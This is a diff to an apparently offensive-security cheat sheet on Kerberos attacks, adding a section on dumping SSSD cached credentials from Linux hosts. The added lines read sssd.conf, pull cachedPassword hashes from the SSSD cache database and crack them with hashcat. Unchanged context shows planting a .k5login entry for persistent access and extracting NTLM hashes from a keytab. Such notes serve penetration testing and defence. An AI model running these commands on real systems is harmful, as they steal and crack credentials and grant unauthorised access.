@@ -1,7 +1,6 @@
 ---
 title: "Kerberos"
-date: 2025-8-4
-tags: ["Kerberos", "Pass-The-Ticket", "Hash Cracking", "Rubeus", "Password Cracking", "Sliver", "Enumeration", "Ntlm", "Smb", "Kerbrute", "Pass-The-Hash", "Impacket", "Ticket Granting Ticket", "Domain Controller", "Active Directory", "Windows", "krb5", "Keytab"]
+tags: ["Kerberos", "Pass-The-Ticket", "Hash Cracking", "Rubeus", "Password Cracking", "Sliver", "Enumeration", "Ntlm", "Smb", "Kerbrute", "Pass-The-Hash", "Impacket", "Ticket Granting Ticket", "Domain Controller", "Active Directory", "Windows", "krb5", "Keytab", "SSSD"]
 ---
 
 ### Users Enum
@@ -668,15 +667,15 @@ Type help for list of commands
 
 ---
 
-### Add Kerberos Access in Linux
+### Kerberos in Linux
+
+#### Add Kerberos Access
 
 ```console
 echo '<USER>@<DOMAIN>' > /home/<TARGET_USER>/.k5login
 ```
 
----
-
-### Extract NTLM from Keytab
+#### Extract NTLM from Keytab
 
 ```console
 # Check
@@ -702,3 +701,53 @@ $ python3 keytabextract.py krb5.keytab
 ```
 
 <small>*Ref: [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)*</small>
+
+#### SSSD Cached Credentials
+
+```console
+# Config
+cat /etc/sssd/sssd.conf
+```
+
+```console {class="sample-code"}
+bash-5.1# cat /etc/sssd/sssd.conf
+[sssd]
+domains = vigilant.vl
+config_file_version = 2
+services = nss, pam
+
+[domain/vigilant.vl]
+default_shell = /bin/bash
+krb5_store_password_if_offline = True
+cache_credentials = True
+krb5_realm = VIGILANT.VL
+realmd_tags = manages-system joined-with-adcli
+id_provider = ad
+fallback_homedir = /home/%d/%u
+ad_domain = vigilant.vl
+use_fully_qualified_names = True
+ldap_id_mapping = True
+access_provider = simple
+simple_allow_users = administrator
+simple_allow_groups = Domain Users
+override_homedir = /home/%d/%u
+enumerate = true
+ldap_search_timeout = 50
+ldap_enumeration_search_timeout = 60
+ldap_network_timeout = 60
+```
+
+```console
+# Get usernames and hashes
+strings /var/lib/sss/db/cache_<DOMAIN>.ldb | grep -B 10 -A 10 cachedPassword | tee result.txt
+```
+
+```console
+# Filter hashes
+cat result.txt | grep -E '^\$' | sort | uniq | tee hashes
+```
+
+```console
+# Crack hashes
+hashcat -m 1800 -a 0 hashes /usr/share/wordlists/rockyou.txt --force
+```
